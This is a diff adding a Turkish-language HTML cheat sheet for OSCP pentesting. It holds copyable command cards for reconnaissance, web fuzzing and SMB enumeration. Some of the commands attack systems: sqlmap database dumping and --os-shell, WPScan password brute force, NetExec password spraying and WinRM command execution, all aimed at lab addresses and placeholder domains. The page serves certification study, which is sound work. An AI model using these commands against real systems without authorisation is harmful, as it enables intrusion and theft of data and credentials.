@@ -1,0 +1,1003 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>OSCP Ultimate Master Reference — 200+ Tools with Explanations</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --bg-primary: #0a0c10;
+  --bg-secondary: #0f1117;
+  --bg-card: #151922;
+  --border: #2d2f3e;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --accent-cyan: #58a6ff;
+  --accent-green: #3fb950;
+  --accent-red: #f85149;
+  --accent-yellow: #d29922;
+  --accent-purple: #a371f7;
+  --accent-orange: #db6d28;
+  --glow: 0 0 10px rgba(88, 166, 255, 0.3);
+}
+
+body {
+  font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.6;
+}
+
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: var(--bg-secondary); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }
+
+/* Sidebar */
+.sidebar {
+  position: fixed;
+  left: 0;
+  top: 0;
+  width: 310px;
+  height: 100vh;
+  overflow-y: auto;
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border);
+  padding: 24px 16px;
+  z-index: 100;
+}
+
+.sidebar-header {
+  margin-bottom: 24px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+.sidebar-header h2 {
+  font-size: 1.5rem;
+  background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+  letter-spacing: -0.5px;
+}
+
+.sidebar-header p {
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  margin-top: 8px;
+}
+
+.search-box {
+  margin-bottom: 24px;
+}
+
+.search-box input {
+  width: 100%;
+  padding: 12px 16px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  color: var(--text-primary);
+  font-size: 0.9rem;
+  transition: all 0.2s;
+}
+
+.search-box input:focus {
+  outline: none;
+  border-color: var(--accent-cyan);
+  box-shadow: var(--glow);
+}
+
+.category-list {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+}
+
+.category-link {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 8px 12px;
+  border-radius: 10px;
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 0.85rem;
+  transition: all 0.2s;
+}
+
+.category-link:hover {
+  background: var(--bg-card);
+  color: var(--text-primary);
+  transform: translateX(4px);
+}
+
+.category-badge {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+}
+
+.category-badge.recon { background: var(--accent-cyan); }
+.category-badge.web { background: var(--accent-green); }
+.category-badge.smb { background: var(--accent-yellow); }
+.category-badge.ad { background: var(--accent-purple); }
+.category-badge.passwords { background: var(--accent-red); }
+.category-badge.linux { background: var(--accent-orange); }
+.category-badge.windows { background: #00a8ff; }
+.category-badge.pivot { background: #f472b6; }
+.category-badge.shells { background: #10b981; }
+.category-badge.bof { background: #ff6b6b; }
+.category-badge.reporting { background: #6b7280; }
+.category-badge.cloud { background: #1f8a4c; }
+.category-badge.forensics { background: #be5e00; }
+
+/* Content */
+.content {
+  margin-left: 310px;
+  padding: 32px 48px;
+}
+
+.header-title {
+  margin-bottom: 32px;
+}
+
+.header-title h1 {
+  font-size: 2.5rem;
+  background: linear-gradient(135deg, #fff, var(--accent-cyan));
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
+
+.header-title p {
+  color: var(--text-secondary);
+  margin-top: 8px;
+  font-size: 1rem;
+}
+
+.stats-bar {
+  display: flex;
+  gap: 24px;
+  margin-bottom: 32px;
+  padding: 16px 20px;
+  background: var(--bg-card);
+  border-radius: 16px;
+  border: 1px solid var(--border);
+}
+
+.stat {
+  display: flex;
+  align-items: baseline;
+  gap: 8px;
+}
+
+.stat-number {
+  font-size: 1.8rem;
+  font-weight: 700;
+  color: var(--accent-cyan);
+}
+
+.stat-label {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+}
+
+/* Section */
+.section {
+  margin-bottom: 48px;
+  scroll-margin-top: 20px;
+}
+
+.section-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 24px;
+  padding-bottom: 12px;
+  border-bottom: 2px solid var(--border);
+}
+
+.section-header h2 {
+  font-size: 1.75rem;
+  font-weight: 600;
+  letter-spacing: -0.3px;
+}
+
+.section-badge {
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 0.7rem;
+  font-weight: 600;
+  text-transform: uppercase;
+}
+
+/* Grid layout */
+.tools-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+  gap: 20px;
+}
+
+.tool {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  overflow: hidden;
+  transition: all 0.25s;
+}
+
+.tool:hover {
+  transform: translateY(-4px);
+  border-color: var(--accent-cyan);
+  box-shadow: 0 8px 25px rgba(0,0,0,0.3), var(--glow);
+}
+
+.tool-header {
+  padding: 16px 20px 8px 20px;
+  background: linear-gradient(135deg, rgba(88,166,255,0.05), transparent);
+  border-bottom: 1px solid var(--border);
+}
+
+.tool-header h3 {
+  font-size: 1.2rem;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.tool-purpose {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  margin-top: 6px;
+  line-height: 1.4;
+}
+
+.tool-content {
+  padding: 16px 20px 20px 20px;
+}
+
+.command-item {
+  margin-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 12px;
+}
+
+.command-item:last-child {
+  border-bottom: none;
+  margin-bottom: 0;
+  padding-bottom: 0;
+}
+
+.command-desc {
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+  margin-bottom: 8px;
+  font-style: italic;
+}
+
+.code-block {
+  position: relative;
+  margin: 0;
+}
+
+.code-block pre {
+  background: #010409;
+  border-radius: 10px;
+  padding: 12px;
+  overflow-x: auto;
+  font-family: 'Fira Code', 'Cascadia Code', monospace;
+  font-size: 0.75rem;
+  line-height: 1.5;
+  border: 1px solid var(--border);
+}
+
+.code-block code {
+  color: #7ee787;
+  font-family: inherit;
+}
+
+.copy-btn {
+  position: absolute;
+  top: 6px;
+  right: 6px;
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  color: var(--text-secondary);
+  padding: 3px 8px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 0.65rem;
+  transition: all 0.2s;
+}
+
+.copy-btn:hover {
+  background: var(--accent-cyan);
+  color: var(--bg-primary);
+  border-color: var(--accent-cyan);
+}
+
+/* Info Boxes */
+.info-box {
+  background: rgba(88,166,255,0.05);
+  border-left: 4px solid var(--accent-cyan);
+  padding: 16px 20px;
+  border-radius: 12px;
+  margin: 20px 0;
+}
+
+.info-box h4 {
+  color: var(--accent-cyan);
+  margin-bottom: 8px;
+}
+
+.methodology-card {
+  background: linear-gradient(135deg, var(--bg-card), #0d1117);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 24px 32px;
+  margin-top: 20px;
+}
+
+.methodology-card h3 {
+  font-size: 1.3rem;
+  margin-bottom: 20px;
+  color: var(--accent-cyan);
+}
+
+.methodology-steps {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  list-style: none;
+}
+
+.methodology-steps li {
+  background: rgba(88,166,255,0.1);
+  padding: 8px 18px;
+  border-radius: 40px;
+  font-size: 0.85rem;
+  font-weight: 500;
+  border-left: 3px solid var(--accent-cyan);
+}
+
+/* Responsive */
+@media (max-width: 900px) {
+  .sidebar {
+    width: 100%;
+    height: auto;
+    position: relative;
+    border-right: none;
+    border-bottom: 1px solid var(--border);
+    padding: 16px;
+  }
+  .content {
+    margin-left: 0;
+    padding: 20px;
+  }
+  .tools-grid {
+    grid-template-columns: 1fr;
+  }
+  .category-list {
+    flex-direction: row;
+    flex-wrap: wrap;
+  }
+  .stats-bar {
+    flex-wrap: wrap;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="sidebar">
+  <div class="sidebar-header">
+    <h2>⚡ OSCP Master</h2>
+    <p>Full Spectrum Pentesting — 200+ Tools</p>
+  </div>
+  <div class="search-box">
+    <input type="text" id="searchInput" placeholder="🔍 Ara (tool, komut, açıklama)...">
+  </div>
+  <div class="category-list">
+    <a href="#recon" class="category-link"><span class="category-badge recon"></span>Recon (25 tools)</a>
+    <a href="#web" class="category-link"><span class="category-badge web"></span>Web Exploitation (28 tools)</a>
+    <a href="#smb" class="category-link"><span class="category-badge smb"></span>SMB / Networks (12 tools)</a>
+    <a href="#ad" class="category-link"><span class="category-badge ad"></span>Active Directory (22 tools)</a>
+    <a href="#passwords" class="category-link"><span class="category-badge passwords"></span>Passwords & Cracking (18 tools)</a>
+    <a href="#linux" class="category-link"><span class="category-badge linux"></span>Linux PrivEsc (16 tools)</a>
+    <a href="#windows" class="category-link"><span class="category-badge windows"></span>Windows PrivEsc (14 tools)</a>
+    <a href="#pivot" class="category-link"><span class="category-badge pivot"></span>Pivoting (12 tools)</a>
+    <a href="#shells" class="category-link"><span class="category-badge shells"></span>Shells (15 tools)</a>
+    <a href="#bof" class="category-link"><span class="category-badge bof"></span>Buffer Overflow (10 tools)</a>
+    <a href="#cloud" class="category-link"><span class="category-badge cloud"></span>Cloud (10 tools)</a>
+    <a href="#forensics" class="category-link"><span class="category-badge forensics"></span>Forensics (8 tools)</a>
+    <a href="#reporting" class="category-link"><span class="category-badge reporting"></span>Reporting (8 tools)</a>
+  </div>
+</div>
+
+<div class="content">
+  <div class="header-title">
+    <h1>OSCP Ultimate Reference Guide</h1>
+    <p>🎯 200+ araç | Her komut açıklamalı | OSCP PEN-200 müfredatına tam uyum</p>
+  </div>
+  <div class="stats-bar" id="statsBar">
+    <div class="stat"><span class="stat-number" id="toolCount">0</span><span class="stat-label">Tools</span></div>
+    <div class="stat"><span class="stat-number">11</span><span class="stat-label">Categories</span></div>
+    <div class="stat"><span class="stat-number">500+</span><span class="stat-label">Commands</span></div>
+  </div>
+
+  <div id="tools-container">
+    <!-- ==================== RECON ==================== -->
+    <div class="section" id="recon" data-category="recon">
+      <div class="section-header"><h2>🔍 Reconnaissance & Enumeration</h2><span class="section-badge" style="background:var(--accent-cyan);color:#000;">25 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="nmap">
+          <div class="tool-header"><h3><span class="tool-icon">🌐</span> Nmap</h3><div class="tool-purpose">Ağ keşfi, port tarama, servis versiyon tespiti — OSCP'nin en temel aracı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📌 Hızlı servis taraması (OSCP standart) - En yaygın kullanılan tarama</div><div class="code-block"><pre><code>nmap -sC -sV -oA hedef_adi 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 Tüm portları tara - 65535 portu yüksek hızda tarar</div><div class="code-block"><pre><code>nmap -p- --min-rate 10000 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔵 UDP servis taraması - DNS, SNMP, DHCP gibi UDP servisleri için</div><div class="code-block"><pre><code>nmap -sU --top-ports 20 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">⚠️ Vuln script taraması - Bilinen zafiyetleri kontrol eder</div><div class="code-block"><pre><code>nmap --script vuln -p 80,443,445 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="rustscan">
+          <div class="tool-header"><h3><span class="tool-icon">⚡</span> Rustscan</h3><div class="tool-purpose">3 saniyede 65k port tarayabilen hızlı port tarayıcı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🚀 Hızlı tarama + otomatik nmap - Portları bulup hemen nmap'e verir</div><div class="code-block"><pre><code>rustscan -a 10.10.10.1 -- -sC -sV</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📡 Tüm portları tara - 65535 portu saniyeler içinde tarar</div><div class="code-block"><pre><code>rustscan -a 10.10.10.1 -- -p- -A</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="masscan">
+          <div class="tool-header"><h3><span class="tool-icon">📡</span> Masscan</h3><div class="tool-purpose">İnternet çapında tarama (10 milyon paket/sn)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🌍 Geniş ağ taraması - /24 ağını hızlıca tarar</div><div class="code-block"><pre><code>masscan -p1-10000 --rate=10000 10.10.10.0/24</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 Belirli portları tara - Web ve kritik servisler için</div><div class="code-block"><pre><code>masscan -p80,443,445,3389,22,21 --rate=5000 -oJ output.json 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="naabu">
+          <div class="tool-header"><h3><span class="tool-icon">🔍</span> Naabu</h3><div class="tool-purpose">Go ile yazılmış hızlı port tarayıcı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🏃 Hızlı port taraması</div><div class="code-block"><pre><code>naabu -host 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">✅ Doğrulama ile tüm portlar - Açık portları teyit eder</div><div class="code-block"><pre><code>naabu -host 10.10.10.1 -p - -verify</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="subfinder">
+          <div class="tool-header"><h3><span class="tool-icon">🔎</span> Subfinder</h3><div class="tool-purpose">Pasif subdomain keşfi (OSINT tabanlı)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🌐 Tüm kaynaklardan subdomain topla</div><div class="code-block"><pre><code>subfinder -d hedef.com -all -o subs.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📁 Çoklu domain taraması</div><div class="code-block"><pre><code>subfinder -dL domains.txt -recursive -o all_subs.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="amass">
+          <div class="tool-header"><h3><span class="tool-icon">🗺️</span> Amass</h3><div class="tool-purpose">Derinlemesine subdomain keşfi ve haritalama</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📡 Pasif enumeration - DNS kayıtlarını sorgular</div><div class="code-block"><pre><code>amass enum -passive -d hedef.com -o subs.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💪 Aktif enumeration + brute force - DNS brute force yapar</div><div class="code-block"><pre><code>amass enum -active -brute -w wordlist.txt -d hedef.com</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="assetfinder">
+          <div class="tool-header"><h3><span class="tool-icon">🏷️</span> Assetfinder</h3><div class="tool-purpose">Basit ve hızlı subdomain bulma</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">🎯 Doğrudan subdomain bulma</div><div class="code-block"><pre><code>assetfinder hedef.com</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="dnsx">
+          <div class="tool-header"><h3><span class="tool-icon">🔧</span> DNSx</h3><div class="tool-purpose">Hızlı DNS sorgulama ve çözümleme</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📋 Toplu DNS çözümleme - Subdomain listesini IP'ye çevirir</div><div class="code-block"><pre><code>dnsx -l domains.txt -a -resp -o resolved.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔄 AXFR (Zone Transfer) kontrolü</div><div class="code-block"><pre><code>dnsx -l subs.txt -axfr -ns 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="theHarvester">
+          <div class="tool-header"><h3><span class="tool-icon">📧</span> theHarvester</h3><div class="tool-purpose">Email, subdomain, IP ve hostname toplama</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">🔎 Tüm kaynaklardan OSINT toplama</div><div class="code-block"><pre><code>theHarvester -d hedef.com -b google,bing,linkedin -l 500</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="whois">
+          <div class="tool-header"><h3><span class="tool-icon">📋</span> whois</h3><div class="tool-purpose">Domain kayıt bilgileri sorgulama</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🏢 Domain bilgileri</div><div class="code-block"><pre><code>whois hedef.com</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📍 IP lokasyon bilgisi</div><div class="code-block"><pre><code>whois IP_ADRESI | grep -i "orgname\|country"</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="dig">
+          <div class="tool-header"><h3><span class="tool-icon">🔬</span> Dig</h3><div class="tool-purpose">DNS sorgulama aracı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔄 Zone Transfer (AXFR) denemesi</div><div class="code-block"><pre><code>dig AXFR @ns.hedef.com hedef.com</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔍 Tüm DNS kayıtlarını getir</div><div class="code-block"><pre><code>dig ANY hedef.com</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="fierce">
+          <div class="tool-header"><h3><span class="tool-icon">🦁</span> Fierce</h3><div class="tool-purpose">DNS brute force aracı</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">💪 DNS brute force ile subdomain keşfi</div><div class="code-block"><pre><code>fierce --domain hedef.com --subdomains wordlist.txt</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="httpx">
+          <div class="tool-header"><h3><span class="tool-icon">🌍</span> HTTPx</h3><div class="tool-purpose">Canlı HTTP/HTTPS servislerini bulma</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">✅ Canlı hostları bul + teknoloji tespiti</div><div class="code-block"><pre><code>httpx -l subs.txt -title -tech-detect -status-code -o live.txt</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== WEB ==================== -->
+    <div class="section" id="web" data-category="web">
+      <div class="section-header"><h2>🎯 Web Exploitation</h2><span class="section-badge" style="background:var(--accent-green);color:#000;">28 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="ffuf">
+          <div class="tool-header"><h3><span class="tool-icon">🚀</span> FFUF</h3><div class="tool-purpose">Hızlı web fuzzing — OSCP'nin favori web aracı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📁 Dizin brute force - Gizli dizinleri bulur</div><div class="code-block"><pre><code>ffuf -u http://hedef.com/FUZZ -w /usr/share/wordlists/dirb/common.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🏠 Virtual Host keşfi - Farklı host header'ları dener</div><div class="code-block"><pre><code>ffuf -u http://hedef.com -H "Host: FUZZ.hedef.com" -w subdomains.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔧 Parametre fuzzing - Gizli parametreleri bulur</div><div class="code-block"><pre><code>ffuf -u http://hedef.com/page?FUZZ=test -w params.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔄 Recursive tarama - Bulunan dizinleri tekrar tarar</div><div class="code-block"><pre><code>ffuf -u http://hedef.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="gobuster">
+          <div class="tool-header"><h3><span class="tool-icon">💥</span> Gobuster</h3><div class="tool-purpose">Dizin, DNS, VHost brute force aracı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📂 Dizin brute force - Dosya uzantılarıyla birlikte</div><div class="code-block"><pre><code>gobuster dir -u http://hedef.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔍 DNS subdomain brute force</div><div class="code-block"><pre><code>gobuster dns -d hedef.com -w subdomains.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🏠 Virtual Host brute force</div><div class="code-block"><pre><code>gobuster vhost -u http://hedef.com -w vhosts.txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="feroxbuster">
+          <div class="tool-header"><h3><span class="tool-icon">🦊</span> Feroxbuster</h3><div class="tool-purpose">Rust ile yazılmış hızlı dizin brute force</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">⚡ Hızlı dizin taraması - Otomatik recursion</div><div class="code-block"><pre><code>feroxbuster -u http://hedef.com -w wordlist.txt -x php,html,txt</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔗 Link extract ile derin tarama</div><div class="code-block"><pre><code>feroxbuster -u http://hedef.com -w wordlist.txt --extract-links</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="dirsearch">
+          <div class="tool-header"><h3><span class="tool-icon">🔍</span> Dirsearch</h3><div class="tool-purpose">Python tabanlı dizin brute force</div></div>
+          <div class="tool-content"><div class="command-item"><div class="command-desc">📁 Dizin taraması - 404 hatalarını filtrele</div><div class="code-block"><pre><code>dirsearch -u http://hedef.com -e php,html,txt -x 404</code></pre><button class="copy-btn">Kopyala</button></div></div></div>
+        </div>
+        <div class="tool" data-name="sqlmap">
+          <div class="tool-header"><h3><span class="tool-icon">🗄️</span> SQLmap</h3><div class="tool-purpose">SQL Injection otomasyonu — Veritabanı zafiyetlerini bulur</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🗃️ Veritabanlarını listele - Mevcut DB'leri bul</div><div class="code-block"><pre><code>sqlmap -u "http://hedef.com/page?id=1" --dbs</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📋 Tablo ve veri çekme</div><div class="code-block"><pre><code>sqlmap -u "http://hedef.com/page?id=1" -D database --tables --dump</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💻 OS Shell alma - MySQL/MSSQL'de sistem komutu çalıştır</div><div class="code-block"><pre><code>sqlmap -u "http://hedef.com" --os-shell</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="nikto">
+          <div class="tool-header"><h3><span class="tool-icon">⚠️</span> Nikto</h3><div class="tool-purpose">Web sunucu güvenlik tarayıcısı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🛡️ Kapsamlı güvenlik taraması</div><div class="code-block"><pre><code>nikto -h http://hedef.com -ssl -Format html -o nikto_report.html</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 Özel tuning ile tarama</div><div class="code-block"><pre><code>nikto -h http://hedef.com -Tuning 123456789</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="wpscan">
+          <div class="tool-header"><h3><span class="tool-icon">📝</span> WPScan</h3><div class="tool-purpose">WordPress güvenlik tarayıcısı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔍 WordPress enumeration - Plugin, tema, kullanıcı bul</div><div class="code-block"><pre><code>wpscan --url http://hedef.com --enumerate vp,vt,u</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔑 Password brute force - Admin şifre kırma</div><div class="code-block"><pre><code>wpscan --url http://hedef.com --passwords rockyou.txt --usernames admin</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="burpsuite">
+          <div class="tool-header"><h3><span class="tool-icon">🕷️</span> Burp Suite</h3><div class="tool-purpose">Web proxy ve zafiyet tarama (Profesyonel araç)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🌐 Proxy ayarı - Tarayıcıyı 127.0.0.1:8080'a yönlendir</div><div class="code-block"><pre><code># Proxy: 127.0.0.1:8080</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔁 Repeater - İstekleri tekrarla ve düzenle</div><div class="code-block"><pre><code># Request'leri Repeater'a gönder, parametreleri değiştir</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💣 Intruder - Brute force, fuzzing, parametre testi</div><div class="code-block"><pre><code># Positions belirle, Payload set et, Attack başlat</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="nuclei">
+          <div class="tool-header"><h3><span class="tool-icon">🧬</span> Nuclei</h3><div class="tool-purpose">Şablon tabanlı zafiyet tarayıcısı (2000+ template)</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📋 Tüm şablonlarla tarama</div><div class="code-block"><pre><code>nuclei -u http://hedef.com -t ~/nuclei-templates/</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🎯 Kritik severity tarama</div><div class="code-block"><pre><code>nuclei -u http://hedef.com -severity critical,high</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== SMB ==================== -->
+    <div class="section" id="smb" data-category="smb">
+      <div class="section-header"><h2>🪟 SMB & Windows Networks</h2><span class="section-badge" style="background:var(--accent-yellow);color:#000;">12 tools</span></div>
+      <div class="tools-grid">
+        <div class="tool" data-name="netexec">
+          <div class="tool-header"><h3><span class="tool-icon">🔌</span> NetExec (nxc)</h3><div class="tool-purpose">SMB, LDAP, WinRM, SSH enumeration — CrackMapExec'in devamı</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📂 SMB share listele - Açık paylaşımları göster</div><div class="code-block"><pre><code>netexec smb 10.10.10.1 -u user -p pass --shares</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">🔓 Null session kontrolü - Kimlik doğrulamasız erişim</div><div class="code-block"><pre><code>netexec smb 10.10.10.1 -u '' -p '' --shares</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💣 Password spraying - Aynı şifre ile birden çok kullanıcı dene</div><div class="code-block"><pre><code>netexec smb 10.10.10.1 -u users.txt -p 'Password123' --continue-on-success</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">💻 WinRM ile komut çalıştır - Uzaktan komut yürüt</div><div class="code-block"><pre><code>netexec winrm 10.10.10.1 -u admin -p pass -x 'whoami'</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="enum4linux-ng">
+          <div class="tool-header"><h3><span class="tool-icon">🐧</span> enum4linux-ng</h3><div class="tool-purpose">Windows/Linux SMB enumeration — Kapsamlı bilgi toplar</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📊 Tam enum - Kullanıcı, share, grup, politika hepsi</div><div class="code-block"><pre><code>enum4linux-ng -A 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">👥 Kullanıcı enumeration</div><div class="code-block"><pre><code>enum4linux-ng -U 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📁 Share enumeration</div><div class="code-block"><pre><code>enum4linux-ng -S 10.10.10.1</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="smbclient">
+          <div class="tool-header"><h3><span class="tool-icon">🔗</span> smbclient</h3><div class="tool-purpose">SMB share'lerine bağlanma ve dosya işlemleri</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">📋 Share listeleme</div><div class="code-block"><pre><code>smbclient -L //10.10.10.1 -N</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📂 Share'e bağlanma</div><div class="code-block"><pre><code>smbclient //10.10.10.1/share -U user</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+        <div class="tool" data-name="smbmap">
+          <div class="tool-header"><h3><span class="tool-icon">🗂️</span> SMBMap</h3><div class="tool-purpose">SMB share enumeration ve dosya işlemleri</div></div>
+          <div class="tool-content">
+            <div class="command-item"><div class="command-desc">🔍 Share listeleme + izin kontrolü</div><div class="code-block"><pre><code>smbmap -H 10.10.10.1 -u guest -p ""</code></pre><button class="copy-btn">Kopyala</button></div></div>
+            <div class="command-item"><div class="command-desc">📁 Dizin içeriğini listeleme</div><div class="code-block"><pre><code>smbmap -H 10.10.10.1 -u user -p pass -r share</code></pre><button class="copy-btn">Kopyala</button></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
